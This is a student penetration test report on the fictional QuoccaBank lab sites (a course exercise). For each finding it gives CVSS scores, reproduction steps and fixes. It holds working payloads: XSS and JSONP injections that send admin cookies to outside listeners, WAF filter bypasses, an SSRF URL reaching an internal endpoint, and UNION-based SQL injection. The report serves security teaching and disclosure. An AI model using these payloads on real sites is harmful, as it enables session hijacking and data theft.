<style>
@media print {
    .pagebreak { page-break-after: always; }
}
</style>

# COMP6443 Report 2 - Part 1
![](https://i.imgur.com/AMETBdu.png)
**Penetration Test Report** - August 08, 2021

Peter Chen (z5255813)
Jayden Leung (z5312070)
Yanning Cao (z5135152)
William Yin (z5017279)
Emma Soo (z5206961)

<div class="pagebreak"> </div>

# Table of Contents
1. [Vulnerabilities](#1.-Vulnerabilities)
    1.1. [sturec.quoccabank.com](#1.1.-sturec.quoccabank.com-JSONP) (JSONP)
    1.2. [ctfproxy2.quoccabank.com/api/me](#1.2.-ctfproxy2.quoccabank.com/api/me)
    1.3. [ctfproxy2.quoccabank.com/api/science-tomorrow](#1.3.-ctfproxy2.quoccabank.com/api/science-tomorrow-Stored-XSS) (Stored XSS)
    1.4. [science-today.quoccabank.com](#1.4.-science-today.quoccabank.com-Stored-XSS) (Stored XSS)
    1.5. [ctfproxy2.quoccabank.com/api/payportal-v2](#1.5.-ctfproxy2.quoccabank.com/api/payportal-v2)
    1.6. [ctfproxy2.quoccabank.com/api/science-tomorrow](#1.6.-ctfproxy2.quoccabank.com/api/science-tomorrow-Reflected-XSS) (Reflected XSS)
    1.7. [sturec.quoccabank.com](#1.7.-sturec.quoccabank.com-Reflected-XSS) (Reflected XSS)
    1.8. [report.quoccabank.com](#1.8.-report.quoccabank.com)
    1.9. [ctfproxy2.quoccabank.com/api/flagprinter-v2](#1.9.-ctfproxy2.quoccabank.com/api/flagprinter-v2)
    1.10. [ctfproxy2.quoccabank.com/api/flagprinter](#1.10.-ctfproxy2.quoccabank.com/api/flagprinter)
    1.11. [profile.quoccabank.com](#1.11.-profile.quoccabank.com)
    1.12. [science-today.quoccabank.com](#1.12.-science-today.quoccabank.com-Reflected-XSS) (Reflected XSS)
2. [Conclusions](#2.-Conclusions)
    2.1. [Summary](#2.1.-Summary)
    2.2. [Final Conclusions](#2.2.-Final-Conclusions)
3. [Appendix](#3.-Appendix)
    3.1. [Additional Vulnerabilities](#3.1.-Additional-Vulnerabilities)
    3.2. [csp.quoccabank.com](#3.2.-csp.quoccabank.com)
    3.3. [Web Servers](#3.3.-Web-Servers)
    3.4. [One-look Vulnerability Table](#3.4.-One-look-Vulnerability-Table)
4. [Glossary](#.4-Glossary)
5. [References](#5.-References)

<div class="pagebreak"> </div>

## Summary of Results
While conducting a penetration test on QuoccaBank, the following was found:
- **0** Critical vulnerabilities
- **4** High vulnerabilities
- **8** Medium vulnerabilities
- **0** Low vulnerabilities

These vulnerabilities have been addressed in further detail within the body of the report.

## Vulnerability Classification
The risks in this report have been classified in accordance to the Common Vulnerability Scoring System (CVSS) version 3.1, an industry standard for assessing the severity of computer system security vulnerabilities. 

For more information, visit the [CVSS specification document](https://www.first.org/cvss/v3.1/specification-document).

<div class="pagebreak"> </div>

# 1. Vulnerabilities
## 1.1. sturec.quoccabank.com (JSONP) 
**Threat - JSONP Script Element Injection**
### Details
| Metric                   | Description |
| ------------------------ | ----------- |
| Access Vector (AV)       | **Network (N)** - A victim must access a vulnerable system via the network. |
| Attack Complexity (AC)   | **Low (L)** - The exploit is repeatable without the requirement of system specific reconnaissance or dealing with race conditions. |
| Privileges Required (PR) | **None (N)** - An attacker must possess some user level privileges to store the malicious scripts in the vulnerable application field. |
| User Interaction (UI)    | **Required (R\)** - The victim needs to navigate to a web page on the vulnerable server that contains malicious scripts injected by the attacker. |
| Scope (S)                | **Unchanged (U)** - The vulnerability does not exceed its scope. |
| Confidentiality (C\)     | **High (H)** - In the worst case, an attacker can create privileged users or perform RCE via shell uploading to take control of the sturec application and the underlying operating system. |
| Integrity (I)            | **High (H)** - In the worst case, an attacker can create privileged users or perform RCE via shell uploading to take control of the sturec application and the underlying operating system. |
| Availability (A)         | **High (H)** - In the worst case, an attacker can shut down the sturec application, or otherwise disrupt service for all users. |

**CVSS Base Score: 8.8 (HIGH)**

### Steps to Reproduce
This vulnerability is found on the sturec.quoccabank.com domain, in the search section of the page. Users can query the student records, which can be abused to perform the attack.
- We note that the site has CSP headers in place to prevent the running of arbitrary script tags.
![](https://i.imgur.com/w6xk6fF.png)
*CSP header*
- After determining that the site is uses JSONP by observation of its network traffic and URL (both of which follow the standard and uses the "callback" variable), we instead target the JSONP protocol by preparing a server we can monitor to receive HTTP requests.
- Noting that URLs may cause issues due to URL encoding, we choose to encode the URL of the server in base64 through the `btoa` command in JavaScript and form the instruction that would ping the server. `fetch(atob("aHR0cHM6Ly93ZWJob29rLnNpdGUvNjJlZDI3ZmMtNjRjMS00NDM2LWI3ODItNWUxZTFkOWY0MGY5Lw==")`
- We append the cookies available in our browser through the `document['cookie']` JavaScript command since we note that `document.cookie` is prohibited.
- This ends up with this payload which we can input into the last name search box field and execute, initiating a request to our monitored server.
```javascript=
<script src=/students.jsonp?callback=fetch(`${atob('aHR0cHM6Ly9lbjR3azl1aW42bWFtOG4ubS5waXBlZHJlYW0ubmV0Lz9hPQ==')}${document['cookie']}`);></script>
```
- By reporting the page to admin, the exact URL along with the malicious payload is rendered on the server, divulging its secret cookies to our monitored server.

### Impact
#### Technical Risk
The vulnerability demonstrates the extraction of the cookie from the "admin" user running the server. This could theoretically grant the malicious actor administrator privileges and may even be a stepping stone to further, even more serious vulnerabilities such as remote code execution.

#### Business Risk
The ability to attack users from a student record page could endanger the student interns at the company and discourage future students from joining QuoccaBank. 

With administrator privileges in the hands of the malicious actor, (while user-facing interface doesn't show it) we can assume that the data present in the database may be altered or Personal Identifiable Information is leaked. Therefore QuoccaBank may operate on altered data thereby leading to a variety of issues including privacy and the accompanying negative press associated with public coverage of an issue like hacking.

### Remediation
This type of exploit is only possible because it leverages off an XSS vulnerability in the search functionality. By patching this, it will prevent the JSONP exploit from being accessible. Below are some remediations for XSS:

- Filter input on arrival. At the point where user input is received, filter as strictly as possible based on what is expected or valid input.
- Encode data on output. At the point where user-controllable data is output in HTTP responses, encode the output to prevent it from being interpreted as active content. Depending on the output context, this might require applying combinations of HTML, URL, JavaScript, and CSS encoding.
- Use appropriate response headers. To prevent XSS in HTTP responses that aren't intended to contain any HTML or JavaScript, you can use the Content-Type and X-Content-Type-Options headers to ensure that browsers interpret the responses in the way you intend.
- Content Security Policy. As a last line of defense, you can use Content Security Policy (CSP) to reduce the severity of any XSS vulnerabilities that still occur.

To prevent the JSONP code execution, simply remove the callback parameter from the the endpoint. This prevents arbitrary code execution. 

For more information on XSS visit [PortSwigger's XSS](https://portswigger.net/web-security/cross-site-scripting)

For more information on JSONP vulnerabilities visit [The state of JSONP (and JSONP vulnerabilities) in 2021](https://dev.to/benregenspan/the-state-of-jsonp-and-jsonp-vulnerabilities-in-2021-52ep)

<div class="pagebreak"> </div>

## 1.2. ctfproxy2.quoccabank.com/api/me
**Threat - Server Side Request Forgery**
### Details

| Metric                   | Description |
| ------------------------ | ----------- |
| Access Vector (AV)       | **Network (N)** - The vulnerable component is bound to the network stack and the set of possible attackers extend.|
| Attack Complexity (AC)   | **Low (L)** - Following the instructions below is all that’s needed. No preparation is required.|
| Privileges Required (PR) | **None (N)** - No privilege escalation is required.|
| User Interaction (UI)    | **None (N)** - User interaction is required.         |
| Scope (S)                | **Changed (U)** - `/avatar.png` file is available to the current user but the exploit lets you access the `/flag` endpoint through the application. |
| Confidentiality (C\)     | **High (H)** - There is total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact.        |
| Integrity (I)            | **None (N)** - There is no impact to availability within the impacted component.|
| Availability (A)         | **None (N)** - There is no impact to availability within the impacted component.|

**CVSS Base Score: 8.6 (HIGH)**

### Steps to Reproduce
This vulnerability is found on the ctfproxy2.quoccabank.com/api/me domain, pertaining to the upload profile picture field. One can submit data through this field, to perform the attack.
- To bypass the `.png` check, a `#` is inserted at the end of the URL. Anything after it gets ignored in a request as it is a comment command character.
- Since we could see an example of how the WAF was acting, instead of the WAF checking `127.0.0.1` ip address which is internal, it checks `google.com` which is stored as credentials thus bypassing the `is_private` check. The `http://google.com` in the below payload helps pass through the regular expression pattern.
- To bypass the deny-list which prohibits `127.0.0.1` string, we instead convert `127` from its decimal form into its octal representation `0177` giving us `0177.0.0.1` which gets resolved to `127.0.0.1` internally but bypasses the check for `127`.
- On success, downloading the "profile image" and treating it as text will reveal the page contents.
```
http://google.com@0177.0.0.1/flag#.png
```
![](https://i.imgur.com/Hlc8rJ8.png)
*Accessing an internal webpage*

### Impact
#### Technical Risk

The vulnerability allows an authenticated user to access pages that they are not authorised for. The risk includes exfiltration of sensitive information as well as the ability to trick the server to make requests on the malicious actor's behalf. 

Additionally, enumeration of all pages regardless of access control permissions can be accomplished through brute forcing pages. Not only can the knowledge of the existence of a page be identified, but also the content within. This exploit can be extrapolated to accessing internal files such as `file://etc/passwd` or internal services such as `ftp://attacker.net:11111`. Due to the opacity of the system, we cannot fully determine if this would be accessible however, one should note that competent attackers would attempt to access these pages and services.


#### Business Risk
Since the vulnerability leaks information stored on the server, depending on the content of the server, risks to the business could range from accidentally leaking an internal password or file which would mean replacing the leaked password or file to reputation loss due to inappropriate content stored on servers or lawsuits from compromised clients, shareholders or employees.
### Remediation
We recommend you to not use regex to extract the domain from the URL. Instead use something like `urlparse('http://www.example.test/foo/bar').netloc` to extract the domain. This delegates the extraction to of the domain to the popular python module `urlparse`. Since this module is constantly updated, when new vulnerabilities are found you can be assured that your application will be automatically patched.

In addition, the `.png` check should not be done by simply checking the extension of the URL. File validation should be done by checking the signatures in the [headers](https://en.wikipedia.org/wiki/List_of_file_signatures) of the file.

For more information visit [OWASP On SSRF prevention](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html) and [PortSwigger's File Upload Functionality](https://portswigger.net/kb/issues/00500980_file-upload-functionality).

<div class="pagebreak"> </div>

## 1.3. ctfproxy2.quoccabank.com/api/science-tomorrow (Stored XSS)
**Threat - Stored XSS in Comment Field**
### Details
| Metric                   | Description |
| ------------------------ | ----------- |
| Access Vector (AV)       | **Network (N)** - The vulnerable component is bound to the network stack, i.e. remotely exploitable.    |
| Attack Complexity (AC)   | **Low (L)** - Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success when attacking the vulnerable component.|
| Privileges Required (PR) | **None (N)** -  The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files of the the vulnerable system to carry out an attack. |
| User Interaction (UI)    | **Required (R\)**  - Successful exploitation of this vulnerability requires a user to take some action before the vulnerability can be exploited. In this case, an Admin needs to view the page specified by the attacker.       |
| Scope (S)                | **Changed (C\)** - An exploited vulnerability can affect resources beyond the security scope managed by the security authority of the vulnerable component. In this case, the vulnerable component and the impacted component are different and managed by different security authorities.    |
| Confidentiality (C\)     | **None (N)** - There is no loss of confidentiality within the impacted component.        |
| Integrity (I)            | **None (N)** - There is no loss of integrity within the impacted component.       |
| Availability (A)         | **High (H)** - There is a total loss of availability, resulting in the attacker being able to fully deny access to resources in the impacted component; this loss is either sustained (while the attacker continues to deliver the attack) or persistent (the condition persists even after the attack has completed).|

**CVSS Base Score: 7.4 (HIGH)**
### Steps to Reproduce
This threat is located on the ctfproxy2.quoccabank.com/api/science-tomorrow domain, pertaining to how the WAF filters user input in the comment field.
- Initial findings show that there is a WAF present in deny-listing comments that contain scripts to cause potential XSS vulnerabilities. 

![](https://i.imgur.com/SC4N9IK.png)
*Example: Trying to enter `<script>alert(1)</script>` will show this message*

- However, this filter/deny-list is by-passable. We can start by re-using the same payload as from the science-today.quoccabank.com equivalent. Note that we will need to setup a public-facing domain again as in the predecessor site such as pipedream or webhook.
```javascript=
<ScRiPt>fetch("https://en5v13isu6609oe.m.pipedream.net/?a=" + document.cookie)</ScRiPt>
```
- `<script>` calls are deny-listed, but we can still load images into comments using `<img>` tags. There also exists a `onerror` attribute to images that will execute some script when the image cannot be loaded. 
- We thus can specify the image tag to write to our website with the cookie of the viewer.
- Our final payload is:
```javascript=
<img src=a onerror=document.location='https://en5v13isu6609oe.m.pipedream.net/?a='+document.cookie>abc
```
- Once sent, click on the report admin button in order to notify the admin account to view the page. This will steal the cookies and send it to our domain.
![](https://i.imgur.com/5Rz2juI.png)
 *The response containing the Admin's cookies is seen above*


### Impact
This domain maintains the same impact risk with its predecessor site,
[science-today.quoccabank.com](##Threat---Stored-XSS-(In-Comment-Field))
#### Technical Risk
The theft of an admin cookie essentially allows any user with this cookie to replace their own, granting them admin privileges to modify the site. This can prove chaotic to the domain as its effects are seen by everyone. More capable attackers could use an admin position here in order to try further attacks against associated domains which thus potentially endangers others.
#### Business Risk
Although this domain is nothing but a science blog, its audience may be impacted by any changes an attacker makes. Graffiti and vandalism could disrupt the user experience or tarnish the reputation of Quoccabank. Furthermore, if the site was to be disabled by the attacker, the user experience would decline drastically, affecting the user's perspective of Quoccabank's reliability.
### Remediation
The core of XSS threats are a result of untrusted data failing to be verified by the domain. Untrusted data includes that of direct user input, API calls and 3rd party systems, user influenced input (cookies, web storage, HTTP header values), Databases, Internal sources, Config files and more.

A well-secured site would ensure this data stays in 'slots' and cannot break out. Developers should not put untrusted data in places such as Scripts, HTML comments, attribute and tag names nor CSS itself.

HTML encoding is required for HTML bodies but other contexts requires attribute encoding (For HTML attributes), JavaScript encoding (For Javascript data values) or URL encoding (For HTML URL Parameters) in order to be well - protected.

Various other preventions include: Avoid JavaScript URLs, Sanitize HTML Markup with a Library Designed for the Job.

There are many other preventions that can be found in: [OWASP On XSS prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html).

In our case, HTML encoding is required for putting the user comment data into HTML Element Content fields. This should render the comment as a string rather than an actual script.

<div class="pagebreak"> </div>

## 1.4. science-today.quoccabank.com (Stored XSS)
**Threat - Stored XSS in Comment Field**
### Details
| Metric                   | Description |
| ------------------------ | ----------- |
| Access Vector (AV)       | **Network (N)** - The vulnerable component is bound to the network stack, i.e. remotely exploitable.    |
| Attack Complexity (AC)   | **Low (L)** - Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success when attacking the vulnerable component.|
| Privileges Required (PR) | **None (N)** -  The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files of the the vulnerable system to carry out an attack. |
| User Interaction (UI)    | **Required (R\)**  - Successful exploitation of this vulnerability requires a user to take some action before the vulnerability can be exploited. In this case, an Admin needs to view the page specified by the attacker.       |
| Scope (S)                | **Changed (C\)** - An exploited vulnerability can affect resources beyond the security scope managed by the security authority of the vulnerable component. In this case, the vulnerable component and the impacted component are different and managed by different security authorities.    |
| Confidentiality (C\)     | **None (N)** - There is no loss of confidentiality within the impacted component.        |
| Integrity (I)            | **None (N)** - There is no loss of integrity within the impacted component.       |
| Availability (A)         | **High (H)** - There is a total loss of availability, resulting in the attacker being able to fully deny access to resources in the impacted component; this loss is either sustained (while the attacker continues to deliver the attack) or persistent (the condition persists even after the attack has completed).|

**CVSS Base Score: 7.4 (HIGH)**

### Steps to Reproduce
This vulnerability is found on the science-today.quoccabank.com domain, in the comment section of the page. Users can submit data through this field, to perform the attack.
- For this vulnerability, one should note the comment box and "Report to Admin" button are the two elements. By inspecting the cookies, we also notice that *HttpOnly* is not set. This means that cookies can be accessed through JavaScript.
![](https://i.imgur.com/xkmnDXK.png)
*HttpOnly is not set, thus cookies can be accessed*
- Some initial tests show that this field is vulnerable to Cross Site Scripting (XSS) injections. ```<ScRiPt>alert(1)</ScRiPt>``` will allow us to bypass the access control list and open an alert prompt. 
- Next, we need to setup a domain to which we can exfiltrate the desired cookie. Websites such as [pipedream](https://pipedream.com/) or [webhook](https://webhook.site) allow an attacker to simply setup a listening and public-facing domain easily.
- We then apply a fetch script directed to our domain with a query, concatenated with the viewer's cookie. A potential payload looks like:
<!-- Note that the payload has to be within a certain length else page breaks. -->
```javascr=
<ScRiPt>fetch("https://en4wk9uin6mam8n.m.pipedream.net/?a=" + document.cookie)</ScRiPt>
```
- After submitting the payload by posting it as a comment and clicking`report this page to admin` button will execute the payload on the Admin's account and thus expose their cookies.
- One can check their hosted domain for any incoming traffic, which will contain the stolen cookie credential
![](https://i.imgur.com/PoAA3d4.png)
*Response returned to the specified domain*

### Impact
#### Technical Risk
The theft of an admin cookie essentially allows any user with this cookie to replace their own, granting them admin privileges to modify the site. This can prove chaotic to the domain as its effects are seen by everyone. More capable attackers could use an admin position here in order to try further attacks against associated domains which thus potentially endangers others.
#### Business Risk
Although this domain is nothing but a science blog, its audience may be impacted by any changes an attacker makes. Graffiti and vandalism could disrupt the user experience or tarnish the reputation of Quoccabank. Furthermore, if the site was to be disabled by the attacker, the user experience would decline drastically, affecting the user's perspective of Quoccabank's reliability.
### Remediation
The core of XSS threats are a result of untrusted data failing to be verified by the domain. Untrusted data includes that of direct user input, API calls and 3rd party systems, user influenced input (cookies, web storage, HTTP header values), Databases, Internal sources, Config files and more.

A well-secured site would ensure this data stays in 'slots' and cannot break out. Developers should not put untrusted data in places such as Scripts, HTML comments, attribute and tag names nor CSS itself.

HTML encoding is required for HTML bodies but other contexts requires attribute encoding (For HTML attributes), JavaScript encoding (For Javascript data values) or URL encoding (For HTML URL Parameters) in order to be well - protected.

Various other preventions include: Avoid JavaScript URLs, Sanitize HTML Markup with a Library Designed for the Job.

There are many other preventions that can be found in: [OWASP On XSS prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html).

In our case, HTML encoding is required for putting the user comment data into HTML Element Content fields. This should render the comment as a string rather than an actual script.

<div class="pagebreak"> </div>

## 1.5. ctfproxy2.quoccabank.com/api/payportal-v2
**Threat - SQL Injection**
### Details

| Metric                   | Description |
| ------------------------ | ----------- |
| Access Vector (AV)       | **Network (N)** - The attacker connects to the exploitable MySQL database over a network. |
| Attack Complexity (AC)   | **Low (L)** - Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success when attacking the vulnerable component. |
| Privileges Required (PR) | **None (N)** - No privileges are required. |
| User Interaction (UI)    | **None (N)** - No interaction required to exploit the system. |
| Scope (S)                | **Unchanged (U)** - Only affect resources managed by the same security authority available to the user with access to the SQL database. |
| Confidentiality (C\)     | **Low (L)** - There is some loss of confidentiality. Access to some restricted information is obtained, but the attacker does not have control over what information is obtained as amount of information available is limited to the SQL database. The information disclosure does not cause a direct, serious loss to the service. |
| Integrity (I)            | **Low (L)** - The injected SQL runs with high privilege and can modify information the attacker should not have access to. The malicious SQL is injected into existing SQL statements that are part of the standard functionality. |
| Availability (A)         | **None (N)** - This vulnerability does not normally affect the availability of the service.|

**CVSS Base Score: 6.5 (MEDIUM)**

### Steps to Reproduce
This threat is located on the ctfproxy2.quoccabank.com/api/payportal-v2 domain, pertaining to how the Web Application Firewall (WAF) filters user input in the search field.
We observe that a WAF has been installed and situated between the user and the server. However, the WAF alone is insufficient to protect the business from malicious actors.
![](https://i.imgur.com/Q2jUerK.png)
![](https://i.imgur.com/CfIpbrQ.png)
*Note that the payload `a" OR 1=1; --a` now throws an accusation that we are a "hacker". [Note: we are a group of penetration testers]*
- In testing, we note that it would appear to be that the WAF reacts to strings that can be represented in Regular Expression (RegExp) as `\s(o|O)(r|R)\s` and the comment strings: `#` and `--`. Where `\s` means "whitespace" (a term that describes any character that is invisible to the naked eye or that functions as a blank "space") and the pipe `|` character means that either the character to the left or the right of the pipe is chosen. For more information on Regular Expressions and a sandbox to experiment with it, please visit a site like [regex101.com](https://regex101.com/) or [regexr.com](https://regexr.com/).
- Noting the above, we can craft our payload to exclude the spaces from the `OR` keyword using any of the below tricks:
    - Not using a space on one side. e.g. `"OR 1=1;`
    - Using the `OR()` function. e.g. `" OR(2);`
    - Using the binary "OR" symbol formed from two pipe (`|`) characters. e.g. `" || 1=1;`
- Furthermore, key SQL keywords like `UNION` and `SELECT` are removed with no fanfare or prompt.
![](https://i.imgur.com/bfqYA4x.png)
*Example of the `SELECT` keyword missing from the server-side result of our payload reflected in the error.*
- We can craft the payload to trick the WAF filter by wrapping the keyword within itself. For example `SEL<SELECT>ECT` or `UN<UNION>ION`.
- This lets us craft a payload to expose the internal database structure similar to the one below:
```sql=
" UNUNIONION SELSELECTECT 1,2,3,4,5,6,7, table_name FROM information_schema.tables;
```
![](https://i.imgur.com/B0QoBUZ.png)
*To get table names*

```sql=
" UNUNIONION SELSELECTECT 1,table_name,column_name,4,5,6,7,8 FROM information_schema.columns;
```
![](https://i.imgur.com/AJSsJK2.png)
*To get column names*

### Impact
As Pay Portal v2 appears to be a derivative of Pay Portal application with a Web Application Firewall, it is vulnerable to the same vulnerabilities as its predecessor and maintains the same risk too.
#### Technical Risk
The vulnerability allows users to view, edit and modify the full SQL database which could be catastrophic for the site. Attackers can not only view confidential data regarding finances, but are also free to edit and potentially delete the database.
This could result in wrecking havoc to income records and plans, which would directly threaten all employees' livelihoods.

The leakage of this information could furthermore be used to target individual users and gather information about them for another attack, perhaps on a different domain, e.g. through taxation records or other financial institutions.

#### Business Risk
A business that cannot protect its employees' information runs the risk of negative press in the event of a cyber attack that may eventuate to lawsuits due to negligence on the institution's behalf.

Financial records in particular are non-trivial, and could lead to quasi-corporate espionage on the behalf of competing businesses who may poach staff, incentivised through the provision of better financial payment.
### Remediation
While adding a WAF is a good start to better protecting the business, there are many more steps that can be taken to improve Pay Portal's security.

Firstly, disable detailed error messages. While they are exceptionally helpful in building and debugging the application, they also are an attacker's good friend with the amount and detail of advice they give. Thanks to the detailed error messages, we were able to work out what data made it to the server and whether the payload we sent was fit for the server to operate on. The most detailed an error message should be: "the input returned no results".

Secondly, only allow valid inputs. This is what's known as an "allowlist" [or formerly "whitelist" (our team is an equal opportunity employer)]. Strict regular expression patterns or word lists should be employed to be matched against a user's "dirty" inputs before being passed through internal software. A quick example would be `(\d{4})-(\d{1,2})-(\d{1,2})` for a bare minimum pattern that would allow a year-month-date like "9999-00-99", but would automatically deny anything from SQL commands like `SELECT` or `UNION` to JavaScript functions like `alert('wow');`.

Thirdly, store the dates in the database using the SQL DATE data type. This works in tandem with the second point by making it far easier to validate user input by limiting the number of valid input format patterns.

For more information on input validation, see [OWASP's article on Input Validation](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html).
For more information visit [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection).

<div class="pagebreak"> </div>

## 1.6. ctfproxy2.quoccabank.com/api/science-tomorrow (Reflected XSS)
**Threat - Reflected XSS in Comment Field**
### Details
| Metric                   | Description |
| ------------------------ | ----------- |
| Access Vector (AV)       | **Network (N)** - A victim must access a vulnerable system via the network. |
| Attack Complexity (AC)   | **Low (L)** - The exploit is repeatable without the requirement of system specific reconnaissance or dealing with race conditions. |
| Privileges Required (PR) | **None (N)** - An attacker must possess some user level privileges to store the malicious scripts in the vulnerable application field. |
| User Interaction (UI)    | **Required (R\)** - The victim needs to navigate to a web page on the vulnerable server that contains malicious scripts injected by the attacker. |
| Scope (S)                | **Unchanged (U)** - The exploited vulnerability can only affect resources managed by the same authority. |
| Confidentiality (C\)     | **None (N)** - There is no loss of confidentiality within the impacted component. |
| Integrity (I)            | **None (N)** - There is no loss of integrity within the impacted component. |
| Availability (A)         | **High (H)** - In the worst case scenario, an attacker can shut down the sturec application, or otherwise disrupt service for all users. |

**CVSS Base Score: 6.5 (MEDIUM)**

### Steps to Reproduce
This threat is located on the ctfproxy2.quoccabank.com/api/science-tomorrow domain, pertaining to how the WAF filters user input in the search field.
- The filter comment option simply reflects the input as a search query in the URL
- Initial testing with payloads such as `<script>alert(1)</script>` show us that there is a WAF in place.
![](https://i.imgur.com/zPl9Ju4.png)
*This shows the WAF deny-listing words*
- This WAF deny-lists specific tags such as`<script>` however we can simply bypass it by using an `<img>` tag.
- The WAF also removes specific strings in the search query. Sending a query with the payload `<img>` removes the `img` string that is reflected.
![](https://i.imgur.com/A4iArKJ.png)
*This shows the WAF removing specific words*
- However this can be bypassed by simply doubling up the word i.e.`<imimgg>a`
![](https://i.imgur.com/YCWAcla.png)
*This shows the WAF successfully bypassed*
- We can then craft a payload to steal the cookies from the user
```javascript=
<imimgg src=a oneonerrorrror=document.location='https://en4wk9uin6mam8n.m.pipedream.net/?a='+document.cookie>a
```
![](https://i.imgur.com/pTG7JUB.png)
*This shows the the insertion point for the script*
- Once the filter comments button has been clicked, the URL of the page changes to include the JavaScript. Reporting the page to admin will result in the Admin's credentials being stolen and sent to the domain specified.

![](https://i.imgur.com/Zvx7j1W.png)
*This shows the response returned to the specified domain*

### Impact
This domain maintains the same impact risk with its predecessor site, [science-today.quoccabank.com](##Threat---Reflected-XSS-(In-Query-Field))
#### Technical Risk
The theft of an admin cookie essentially allows any user with this cookie to replace their own, granting them admin privileges to modify or edit the site. This can prove chaotic to the domain as its effects are seen by everyone. More capable attackers could use an admin position here in order to try further attacks against associated domains which thus potentially endangers others.
#### Business Risk
Although this domain is nothing but a science blog, its audience may be impacted by any changes an attacker makes. Graffiti and vandalism could disrupt the user experience or tarnish the reputation of Quoccabank. Furthermore, if the site was to be disabled by the attacker, the user experience would decline drastically, affecting the user's perspective of Quoccabank's reliability.
### Remediation
The core of XSS threats are a result of untrusted data failing to be verified by the domain. Untrusted data includes that of direct user input, API calls and 3rd party systems, user influenced input (cookies, web storage, HTTP header values), Databases, Internal sources, Config files and more.

A well-secured site would ensure this data stays in 'slots' and cannot break out. Developers should not put untrusted data in places such as Scripts, HTML comments, attribute and tag names nor CSS itself.

HTML encoding is required for HTML bodies but other contexts requires attribute encoding (For HTML attributes), JavaScript encoding (For Javascript data values) or URL encoding(For HTML URL Parameters) in order to be well - protected.

Various other preventions include: Avoid JavaScript URLs, Sanitize HTML Markup with a Library Designed for the Job.

There are many other preventions can be found on the subsequent report: [OWASP On XSS prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html).

In our case, URL encoding is required for putting the user query into URL. This should prevent the query from being executed as a script, rather as a string query.

In addition, deny-list tags should be avoided and instead be replaced with allow-listing as it is less prone to loopholes.

<div class="pagebreak"> </div>

## 1.7. sturec.quoccabank.com (Reflected XSS)
**Threat - Reflected XSS in Student Creation Form**
### Details
| Metric                   | Description |
| ------------------------ | ----------- |
| Access Vector (AV)       | **Network (N)** - A victim must access a vulnerable system via the network. |
| Attack Complexity (AC)   | **Low (L)** - The exploit is repeatable without the requirement of system specific reconnaissance or dealing with race conditions. |
| Privileges Required (PR) | **None (N)** - An attacker must possess some user level privileges to store the malicious scripts in the vulnerable application field. |
| User Interaction (UI)    | **Required (R\)** - The victim needs to navigate to a web page on the vulnerable server that contains malicious scripts injected by the attacker. |
| Scope (S)                | **Unchanged (U)** - The exploited vulnerability can only affect resources managed by the same authority. |
| Confidentiality (C\)     | **None (N)** - There is no loss of confidentiality within the impacted component. |
| Integrity (I)            | **None (N)** - There is no loss of integrity within the impacted component. |
| Availability (A)         | **High (H)** - In the worst case scenario, an attacker can shut down the sturec application, or otherwise disrupt service for all users. |

**CVSS Base Score: 6.5 (MEDIUM)**

### Steps to Reproduce
A stored XSS vulnerability exists in the "Student Create" page of sturec.quoccabank.com.
- By including a script tag in the "Last Name" field and successfully creating a student;

![](https://i.imgur.com/JZ2XgCw.png)

- The next attempt to create a student with the same details (email and last name) will trigger the script.

![](https://i.imgur.com/gHEWkhF.png)

- On the "create student" page, we note that there are client-side restrictions that supplement the same restrictions server-side mostly related to string lengths.
- However, we note too that `dcreat` and `gridCheck` are both unchecked on the client-side and server-side.
- By intercepting the request and inserting the payload below into either or both of the variables, we can successfully store a malicious XSS payload and report the page to admin to extract the cookie from the admin account.
- In developing the payload, we note that the server filters user inputs using the Regex string `<(?:\w+)\W+?[\w]` and thus in order to successfully bypass the one-pass filter, we crafted a payload which lets the filter remove one instance of the character pattern `<script>|<s`.
```javascript=
<<script>|<sscript src=/students.jsonp?callback=fetch(${atob('aHR0cHM6Ly93ZWJob29rLnNpdGUvNjJlZDI3ZmMtNjRjMS00NDM2LWI3ODItNWUxZTFkOWY0MGY5Lw==')}${document['cookie']});></script>
```
![](https://i.imgur.com/H8QDk2B.png)
*Client-side request*

![](https://i.imgur.com/Wi7eNk0.png)
*Server-side request*

### Impact
#### Technical Risk
By hosting a malicious script on the student's page, attackers are able to steal and exfiltrate the cookie for any user who views the page, and in its extremity, target those with positions of power such as administrators or moderators. Doing so would grant the attacker the ability to login and masquerade themselves as the administrator, bestowing them escalated privileges (i.e. authorisation to create, update, delete) that could prove both destructive in vandalism or could be used as a stepping-stone for a larger attack.
#### Business Risk
Damage to this domain not only directly impacts quoccabank's reputation negatively, but its consumers and clients privacy. Attackers could leak user information gleaned from the un-authenticated access to their accounts, selling or distributing confidential information. This opens up the business to potential lawsuits for the negligence causing a breach of privacy.
### Remediation
The core of XSS threats are a result of untrusted data failing to be verified by the domain. Untrusted data includes that of direct user input, API calls and 3rd party systems, user influenced input (cookies, web storage, HTTP header values), Databases, Internal sources, Config files and more.

A well-secured site would ensure this data stays in "slots" and cannot break out. Developers should not put untrusted data in places such as Scripts, HTML comments, attribute and tag names nor CSS itself.

HTML encoding is required for HTML bodies but other contexts requires attribute encoding (for HTML attributes), JavaScript encoding (for Javascript data values) or URL encoding (for HTML URL parameters) in order to be well - protected.

Various other preventions include: Avoid JavaScript URLs, Sanitize HTML Markup with a Library Designed for the Job.

There are many other preventions can be found on the subsequent report: [OWASP On XSS prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html).

In our case, hidden and unused fields should be removed if not used, or filtered to prevent injection of scripts and code.

<div class="pagebreak"> </div>

## 1.8. report.quoccabank.com
**Threat - XSS, HTTP Response Splitting**
### Details
| Metric                   | Description |
| ------------------------ | ----------- |
